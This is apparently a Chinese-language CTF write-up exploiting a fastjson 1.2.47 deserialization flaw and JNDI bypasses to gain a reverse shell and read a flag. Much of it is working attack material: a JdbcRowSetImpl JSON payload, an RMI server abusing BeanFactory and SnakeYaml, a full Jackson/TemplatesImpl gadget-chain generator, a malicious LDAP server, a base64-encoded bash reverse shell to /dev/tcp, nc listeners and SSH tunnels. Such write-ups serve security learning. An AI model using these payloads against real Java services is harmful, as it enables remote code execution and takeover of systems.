显而易见考察的是 fastjson1.2.47 反序列化漏洞的利用。于是我先尝试的是最简单的 JdbcRowSetImpl 用 ldap 返回 Reference 加载远程类的方式。

还是偷个懒，不在服务器上重新搞过了，就开一个 ssh 反向隧道把本地 Yakit 反连服务器的端口映射到云服务器上去做题，本地跑一下题目的文件，然后 ldap 放云服务器的 ip 和端口。发包，成功执行命令。

```shell
ssh -fNR 8520:localhost:8085 root@ip 创建ssh反向隧道
ps aux | grep "ssh -NfR" 查看ssh连接情况
netstat -tuln | grep 8520 查看端口状态
nc -l -p 8520 nc监听请求
nc -lvvp 12345 接收反弹shell
```

payload 改一下云服务器 ip 其他和前面的复现一致

```
{{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8085/PrIXqXOz","autoCommit":true}}
```

证明当前 jdk8u181 环境下该利用方式可行，与云服务器连接正常

![](/img/fastjsonAndJNDI/P2nXbbauYoA95kx5cFqctNnJnfc.png)

然而当我去打开靶机用同样的方式尝试时，发现远程恶意类下载失败，只有 LDAP 连接没有 HTTP 连接，推测可能是靶机 jdk 版本高于 oracle 8u191，`com.sun.jndi.ldap.object.trustURLCodebase` 属性的默认值被调整为 false

{% note warning %}

**纠错：**后来发现，由于偷懒，其实返回的 Reference 就有问题（如下图）。我发送的 json payload 中地址使用的是云服务器 ip，靶机可以正常访问，然而靶机接收到 Reference 后 Reference 内的远程 Factory 地址为 127.0.0.1 没有更改，靶机压根就不会再访问云服务器，而本地测试自然就不会有问题。一开始原理没有弄懂，但似乎歪打正着了，难绷......

{% endnote %}

![](/img/fastjsonAndJNDI/EfYIbDPmuokjadxXcoPc0Clsnac.png)

去包里的 MANIFEST.MF 文件查看 jar 包的打包编译版本发现是 1.8，但没有再具体的版本号了。推测可能大于 oracle 8u191。

![](/img/fastjsonAndJNDI/Sdnsbzp5NoXufpx46rsckGRjnxb.png)

后续思路或许就要考虑 JNDI 的高版本绕过，关注一下依赖发现有 spring、Tomcat、Jackson、log4j2、SnakeYaml 这些，从中寻找可利用的链

我首先尝试的是基于本地工厂类的绕过方式：

先写一个恶意静态类，然后打包为 jar 包，`python -m http.server 9999` 在文件所在目录快速起一个 http 服务以供获取恶意 jar 包。

我用如下 rmi 服务端返回一个 Reference，用 BeanFactory 去调用 SnakeYaml 反序列化 payload，从而远程下载我准备好的恶意 payload.jar 用 ScriptEngineManager 去加载、实例化、运行恶意代码。

```
package com.demo.jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class jndi_bypass_snakeYaml {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry._createRegistry_(1099);
        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        String context = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://127.0.0.1:9999/payload.jar\"]\n" +
                "  ]]\n" +
                "]";
        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", context));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Exploit", referenceWrapper);
        System._out_.println("Server Started!");
    }
}
```

但是基于 beanfactory 使用 SnakeYaml 的绕过失败：我调试客户端（app.jar）运行过程，发现 tomcat9 版本禁用了 `ForceString`，导致无法给属性强制指定 `setter` 方法，也就无法进一步的调用目的类。这里不再赘述，具体实现参考“其他版本的绕过”部分引用的文章。

![](/img/fastjsonAndJNDI/Njcjbvwf8oCKwtxyqIAcZft2nvd.png)

再尝试服务端返回数据流反序列化 gadget：

由于网上常见的 cc 链解法在该题中并没有其依赖无法实现，加上时间原因没有好好学，所以这里卡住了一下。经过 mys1d 佬指点以及进一步的网络搜索，发现本题可以通过 Jackson 的原生反序列化漏洞解决（佬：Jackson 依赖是 springboot 自带的，大概 jdk11 以下版本都能用这条链）。

常见的 Jackson 反序列化漏洞与 fastjson 类似，为了满足多态需求，设置了全局 Default Typing 机制和 JsonTypeInfo 注解，通过这些可以实现任意指定类的反序列化，有大概四个较低 Jackson 版本及 jdk 版本的 CVE。但本题的 Jackson 版本等均不符合条件，所以需要通过原生反序列化漏洞来打。

使用如下代码生成字节流并 base64 处理输出

```
package com.demo.jndi;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import org.springframework.aop.framework.AdvisedSupport;
import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.*;
import java.util.Base64;

public class unserial_jackson {
    public static void main(String[] args) throws Exception {
        //获取BaseJsonNode类并删除 writeReplace 方法，避免利用链被破坏
        ClassPool pool = ClassPool._getDefault_();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ctClass0.toClass();
        //构造一个动态生成的类 a，继承自 AbstractTranslet，其中写入恶意命令反弹 shell
        CtClass ctClass = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);
        constructor.setBody("Runtime.getRuntime().exec(\"bash -c {echo,此处写base64加密后的字符串不需要引号}|{base64,-d}|{bash,-i}\");");
        ctClass.addConstructor(constructor);
        byte[] bytes = ctClass.toBytecode();
        //TemplatesImpl用于加载字节码实例化恶意类，调用 newTransformer() 时自动加载 _bytecodes 指定的类
        Templates templatesImpl = new TemplatesImpl();
        _setFieldValue_(templatesImpl, "_bytecodes", new byte[][]{bytes});//a 的字节码
        _setFieldValue_(templatesImpl, "_name", "test");
        _setFieldValue_(templatesImpl, "_tfactory", null);
        //利用 JdkDynamicAopProxy 进行封装使其稳定触发
        Class<?> clazz = Class._forName_("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
        cons.setAccessible(true);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templatesImpl);
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
        Object proxyObj = Proxy._newProxyInstance_(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
        POJONode jsonNodes = new POJONode(proxyObj);//将代理对象包装进了一个 Jackson 节点，为后续的反序列化打包做准备
        //封装进 BadAttributeValueExpException，将 Jackson 的 POJONode(proxyObj) 放进 exp 的 val 字段
        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
        Field val = Class._forName_("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(exp,jsonNodes);
        //Java 原生序列化，并使用 Base64 编码输出
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
        objectOutputStream.writeObject(exp);
        objectOutputStream.close();
        String res = Base64._getEncoder_().encodeToString(barr.toByteArray());
        System._out_.println(res);

    }
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
}
```

**注意：**使用 java 的 Runtime.getRuntime().exec 来反弹 shell 时需要注意分割的问题，参考[这篇文章](https://www.cnblogs.com/BOHB-yunying/p/15523680.html)将命令用 base64 加密后放入语句内执行。例如 `bash -i >&/dev/tcp/127.0.0.1/8888 0>&1` 加密后放入

```shell
Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}");
```

ldap 服务端网上拿来略作修改，将上面输出的内容复制进去，等待连接并返回字节流

```
package com.demo.jndi;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;
import ysoserial.Serializer;
import ysoserial.payloads.CommonsCollections6;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;


public class ldap_evil_server {

    private static final String _LDAP_BASE _= "dc=example,dc=com";

    public static void main ( String[] tmp_args ) {
        int port = 8888;
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(_LDAP_BASE_);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress._getByName_("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory._getDefault_(),
                    SocketFactory._getDefault_(),
                    (SSLSocketFactory) SSLSocketFactory._getDefault_()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System._out_.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
            System._out_.println("Send LDAP reference result for " + base);
            e.addAttribute("javaClassName", "foo");
//calc      byte[] calcs = Base64.decode("rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAALXQAHmNvbS5kZW1vLmpuZGkudW5zZXJpYWxfamFja3NvbnQAFXVuc2VyaWFsX2phY2tzb24uamF2YXQABG1haW5zcgAmamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUxpc3T8DyUxteyOEAIAAUwABGxpc3RxAH4AB3hyACxqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlQ29sbGVjdGlvbhlCAIDLXvceAgABTAABY3QAFkxqYXZhL3V0aWwvQ29sbGVjdGlvbjt4cHNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeHEAfgAVeHNyACxjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5QT0pPTm9kZQAAAAAAAAACAgABTAAGX3ZhbHVlcQB+AAF4cgAtY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuVmFsdWVOb2RlAAAAAAAAAAECAAB4cgAwY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuQmFzZUpzb25Ob2RlAAAAAAAAAAECAAB4cHN9AAAAAQAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXN4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgA0b3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkpka0R5bmFtaWNBb3BQcm94eUzEtHEO65b8AgADWgANZXF1YWxzRGVmaW5lZFoAD2hhc2hDb2RlRGVmaW5lZEwAB2FkdmlzZWR0ADJMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvZnJhbWV3b3JrL0FkdmlzZWRTdXBwb3J0O3hwAABzcgAwb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkFkdmlzZWRTdXBwb3J0JMuKPPqkxXUCAAZaAAtwcmVGaWx0ZXJlZFsADGFkdmlzb3JBcnJheXQAIltMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvQWR2aXNvcjtMABNhZHZpc29yQ2hhaW5GYWN0b3J5dAA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL2ZyYW1ld29yay9BZHZpc29yQ2hhaW5GYWN0b3J5O0wACGFkdmlzb3JzcQB+AAdMAAppbnRlcmZhY2VzcQB+AAdMAAx0YXJnZXRTb3VyY2V0ACZMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvVGFyZ2V0U291cmNlO3hyAC1vcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuUHJveHlDb25maWeLS/Pmp+D3bwIABVoAC2V4cG9zZVByb3h5WgAGZnJvemVuWgAGb3BhcXVlWgAIb3B0aW1pemVaABBwcm94eVRhcmdldENsYXNzeHAAAAAAAAB1cgAiW0xvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5BZHZpc29yO9+DDa3SHoR0AgAAeHAAAAAAc3IAPG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5EZWZhdWx0QWR2aXNvckNoYWluRmFjdG9yeVTdZDfiTnH3AgAAeHBzcgAUamF2YS51dGlsLkxpbmtlZExpc3QMKVNdSmCIIgMAAHhwdwQAAAAAeHNxAH4AFAAAAAB3BAAAAAB4c3IANG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLnRhcmdldC5TaW5nbGV0b25UYXJnZXRTb3VyY2V9VW71x/j6ugIAAUwABnRhcmdldHEAfgABeHBzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AAVMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAAVbK/rq+AAAAMwAYAQABYQcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlDAAFAAYKAAQACAEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BAARjYWxjCAAQAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEgATCgALABQBAApTb3VyY2VGaWxlAQAGYS5qYXZhACEAAgAEAAAAAAABAAEABQAGAAEABwAAABoAAgABAAAADiq3AAm4AA8SEbYAFVexAAAAAAABABYAAAACABdwdAAEdGVzdHB3AQB4");
            byte[] calcs = Base64._decode_("rO0ABXNyACBXJ9o......省略");
            e.addAttribute("javaSerializedData", calcs);
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode._SUCCESS_));
        }
    }
}
```

启动服务端后先在本地调试，从之前漏洞复现时无法进入的 `lookup` 步入看看

![](/img/fastjsonAndJNDI/JWMAbYdTuoAWgdxI8LacqieynGb.png)

继续步入 `p_lookup()`

![](/img/fastjsonAndJNDI/LOnZbFEf4oIi80xoGclcyo6anFe.png)

继续步入 `c_lookup()`

![](/img/fastjsonAndJNDI/Y3DlbBLAqohAjGxtKQ2cLPlanNh.png)

步入 `doSearchOnce()`

![](/img/fastjsonAndJNDI/Nx31bD65Jo4VrbxdnzBcSFH3nce.png)

步入 `doSearch()`

![](/img/fastjsonAndJNDI/FrqebHkYfoIQgYxhx7EcfP1vnNf.png)

步入 `search()` 大概是查找指定目标

![](/img/fastjsonAndJNDI/XjEJbxvo3oMoNcxZJF1cZPUMn7g.png)

到 `writeRequest()` 处会从 ldap 服务端获取数据流，服务端可以看到响应输出，360 也会在这个时候告警。后续多次步过，三次 return

![](/img/fastjsonAndJNDI/X4aybhcIaogljYxabcgcozIQnfh.png)

回到 `c_lookup()`，接下来判断 `JAVA_ATTRIBUTES[2]` 即 `javaClassName` 是否为空

![](/img/fastjsonAndJNDI/XNGqbLHmJopYLIxDPulcXuEQnDh.png)

当 `javaClassName` 存在时对目标进行解码，步入 `Obj.decodeObject()`

![](/img/fastjsonAndJNDI/Is2FbGZhQoAcujxkEkEciIi1nJh.png)

`getCodebases()` 获取 `javaCodebase` 属性，我们没有使用，为空，继续步过

![](/img/fastjsonAndJNDI/S6ohbiNUToceZPxY5IBcJ79gnch.png)

当属性 javaSerializedData 不为空时，`getURLClassLoader()` 根据 `javaCodebase` 属性获取加载器（空，选择默认加载器）返回 `deserializeObject()` 去反序列化，步入 `deserializeObject()`

![](/img/fastjsonAndJNDI/EBGtbem23owygvxk5plcMFVrnBb.png)

在这里进行原生反序列化，执行命令

![](/img/fastjsonAndJNDI/Lh91bjWJwo4HmmxbryScFBIvns3.png)

接下来正式做题，还是把本地服务端端口映射到云服务器，向靶机发包

![](/img/fastjsonAndJNDI/BWurbMSU2o1Upgxyhnbc0UBknYe.png)

本地服务端可以看到靶机的远程请求抵达了本地

![](/img/fastjsonAndJNDI/EP48bd2sEoCHStxWFkmcBSapnV7.png)

云服务器上使用 `nc -lvvp 12345` 监听 12345 端口并显示详细信息，成功接收到反弹 shell

![](/img/fastjsonAndJNDI/H54wbEctgoIW5wxSujTcJZULnKh.png)

查看一下基本情况，当前普通用户权限，根目录发现 flag

![](/img/fastjsonAndJNDI/Ge9ibYoTWoQSpLxxhBWcZpJ5nTb.png)

flag 为 root 用户所有，无法 `cat flag`，使用命令 `find / -perm -4000 -type f 2>/dev/null` 查找 SUID 文件，发现 `/readflag`（Oh No 眼瞎了...），`/readflag` 直接解决。

![](/img/fastjsonAndJNDI/SWPXbwUk8oTTEAxfM8bcTZPon2f.png)

# 总结

JNDI 很多内容在流程分析时没有成功调试进去，然后就暂时先不管了，对于 JNDI 还有 Jackson 的学习还比较浅，后续有空的时候再专门研究一下它的原理和各种利用链、绕过方法，还需要找机会学习一下一般如何寻找利用链

另外，初学时偷懒不可取，本篇已经因此造成两次错误了

其实这一系列里面可学的可写的还很多，但是全写一起太乱了，有空的时间再整理总结一下（希望有罢）。

这一趟学习下来还收获、实践了几个小技巧：如何分析 jar 包，如何分析 jar 包使用的 jdk 版本，如何快速起一个 http 服务，以及对于 spring 项目如何获取可能有用的报错细节（将发包的 Accept 字段设为*/*，spring 项目的详细报错信息一般会以 json 格式返回，当然这里的题用不到）

# 主要参考资料汇总

- B 站视频，总结了 checkAutoType()整体的判断逻辑，画了流程图方便理解，复现的操作展示、调用过程分析跟着视频看会更好理解一些 [https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.1387.homepage.video_card.click&vd_source=ae44e9df2e6bb265e83888153930e885](https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.1387.homepage.video_card.click&vd_source=ae44e9df2e6bb265e83888153930e885)
- 这篇 fastjson 各个版本的漏洞分析都比较全面详细，fastjson 反序列化漏洞有些东西忘记了可以结合这篇和下面一篇查看 [https://su18.org/post/fastjson/](https://su18.org/post/fastjson/)
- 这篇 fastjson 各个版本的漏洞总结得也比较全面详细，可以结合上面一篇一起查看 [https://www.freebuf.com/vuls/361576.html](https://www.freebuf.com/vuls/361576.html)
- 这篇是 JNDI 的文章，主要是 JNDI 的概念和通过 rmi、ldap 的利用途径、高版本绕过，相较下一篇会更条例清晰简洁一些 [https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/](https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/)
- 这篇也是 JNDI，主要是 JNDI 的前置知识和通过 rmi、ldap 的利用示例，和上一篇结合起来看 [https://www.cnblogs.com/nice0e3/p/13958047.html](https://www.cnblogs.com/nice0e3/p/13958047.html)
- fastjson 反序列化相关不出网利用的 CTF 例题，不是很懂，拓展学习一下 [https://www.anquanke.com/post/id/283079](https://www.anquanke.com/post/id/283079)
- SnakeYaml 的反序列化，拓展一下 [https://tttang.com/archive/1815/#toc_spi](https://tttang.com/archive/1815/#toc_spi)
- 高版本 Tomcat 的 JNDI 利用拓展一下 [https://xz.aliyun.com/news/16156](https://xz.aliyun.com/news/16156)
- fastjson 各种利用链总结，比较清晰 [http://www.bmth666.cn/2022/04/11/Fastjson%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html](http://www.bmth666.cn/2022/04/11/Fastjson%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html)
- JNDI 总结，相对全面详细 [https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/)
- 高版本 JNDI 注入思路总结，目录很清晰 [https://www.cnblogs.com/R0ser1/p/17105579.html](https://www.cnblogs.com/R0ser1/p/17105579.html)
- 简洁的 Jackson 这条利用链的 payload 和一道题的解析，还有其他 java 相关的总结 [https://p4d0rn.gitbook.io/java/serial-journey/fastjson/jackson](https://p4d0rn.gitbook.io/java/serial-journey/fastjson/jackson)
- Jackson 原生反序列化的分析 https://www.viewofthai.link/2023/08/08/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/
